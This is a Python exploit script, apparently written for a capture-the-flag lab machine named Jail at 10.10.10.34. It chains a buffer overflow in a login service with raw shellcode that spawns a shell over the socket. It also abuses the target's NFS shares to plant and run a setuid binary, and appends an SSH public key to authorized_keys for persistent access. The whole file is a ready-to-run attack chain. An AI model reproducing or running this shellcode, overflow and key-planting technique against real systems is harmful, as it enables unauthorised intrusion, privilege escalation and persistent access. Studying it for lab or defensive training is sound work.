#!/usr/bin/env python
from pwn import *
import os
import getpass

SHELLCODE = (
	"\x6a\x02\x5b\x6a\x29\x58\xcd\x80\x48\x89\xc6"
	"\x31\xc9\x56\x5b\x6a\x3f\x58\xcd\x80\x41\x80"
	"\xf9\x03\x75\xf5\x6a\x0b\x58\x99\x52\x31\xf6"
	"\x56\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e"
	"\x89\xe3\x31\xc9\xcd\x80"
)

IP = '10.10.10.34'
PORT = 7411

LOCAL_NFSSHARE_DIR = '/mnt/nfsshare/'
REMOTE_NFSSHARE_DIR = '/var/nfsshare/'
WORKING_DIR = 'abc/'

LOCAL_OPT_DIR = '/mnt/opt/'
REMOTE_OPT_DIR = '/opt/'

def service_login(_user, _pass, _sleep_time=0.5):
	token = "\n\x00"
	p = remote(IP, PORT)

	p.send(token)
	p.readline()
	sleep(_sleep_time)

	p.send('DEBUG' + token)
	p.readline()
	sleep(_sleep_time)

	p.send('USER ' + _user + token)
	p.readline()
	

	p.send('PASS ' + _pass + token)
	sleep(_sleep_time)

	return p

def get_non_privileged():

	p = service_login('admin', 'pass')
	str_pointer = p.readline()
	p.close()
	str_pointer = str_pointer[24:-1]

	print('[+] UserPass String Pointer: {}'.format(str_pointer))
	print('[+] Preparing payload...')
	pointer = p32(int(str_pointer, 16) + 0x20)
	payload = 'A' * 28 + pointer + SHELLCODE

	p = service_login('admin', payload)
	p.readline()

	p.send("HOME=/home/frank\n")

	return p

def mount_nfs_units():
	os.system('sudo mkdir -p {local_dir} 2>/dev/null'.format(
		local_dir=LOCAL_NFSSHARE_DIR
	))
	os.system('sudo mkdir -p {local_dir} 2>/dev/null'.format(
		local_dir=LOCAL_OPT_DIR
	))

	os.system('sudo mount -t nfs {ip}:{remote_dir} {local_dir}'.format(
		ip=IP, 
		remote_dir=REMOTE_NFSSHARE_DIR, 
		local_dir=LOCAL_NFSSHARE_DIR
	))
	os.system('sudo mount -t nfs {ip}:{remote_dir} {local_dir}'.format(
		ip=IP,
		remote_dir=REMOTE_OPT_DIR,
		local_dir=LOCAL_OPT_DIR
	))

def umount_nfs_units():
	os.system('sudo umount {local_dir}'.format(local_dir=LOCAL_NFSSHARE_DIR))
	os.system('sudo umount {local_dir}'.format(local_dir=LOCAL_OPT_DIR))

	os.system('sudo rm -R {local_dir}'.format(local_dir=LOCAL_NFSSHARE_DIR))
	os.system('sudo rm -R {local_dir}'.format(local_dir=LOCAL_OPT_DIR))

def file_get_contents(filename):
	with open(filename) as f:
		return f.read()

def exec_suid_binary(p):
	os.system('mkdir -p {local_dir}{workding_dir} 2>/dev/null'.format(
		local_dir=LOCAL_NFSSHARE_DIR,
		workding_dir=WORKING_DIR
	))

	os.system('gcc test.c -o {local_dir}{workding_dir}test'.format(
		local_dir=LOCAL_NFSSHARE_DIR,
		workding_dir=WORKING_DIR
	))

	os.system('chmod 4777 {local_dir}{workding_dir}test'.format(
		local_dir=LOCAL_NFSSHARE_DIR,
		workding_dir=WORKING_DIR
	))

	p.send("{remote_dir}{workding_dir}test\n".format(
		remote_dir=REMOTE_NFSSHARE_DIR,
		workding_dir=WORKING_DIR
	))

def enable_ssh_access(p):
	#private_key = file_get_contents(os.environ['HOME'] + "/.ssh/jail_ssh")
	public_key = file_get_contents(os.environ['HOME'] + "/.ssh/jail_ssh.pub")

	#p.send("echo '{private_key}' > ~/.ssh/jail_ssh\n".format(private_key=private_key))
	p.send("echo '{public_key}' > ~/.ssh/jail_ssh.pub\n".format(public_key=public_key))

	p.send("chmod 600 ~/.ssh/jail_ssh.pub\n")

	p.send("cat ~/.ssh/jail_ssh.pub >> ~/.ssh/authorized_keys\n")

def main():
	print('[+] mounting NFS partitions...')
	mount_nfs_units()
	
	print('[+] Getting Non-privileged shell...')
	p = get_non_privileged()

	print('[+] Preparing suid binary...')
	exec_suid_binary(p)

	print('[+] Enabling SSH Access...')
	enable_ssh_access(p)
	p.close()

	print('[+] Opening interactive session over SSH...')
	os.system("terminator -e 'ssh -vi ~/.ssh/jail_ssh frank@10.10.10.34'")
	
	#s = ssh(host=IP, user='frank', keyfile='~/.ssh/jail_ssh')
	#s.interactive()

	print('[+] Unmounting NFS partitions...')
	umount_nfs_units()

#context.log_level = 'debug'
main()
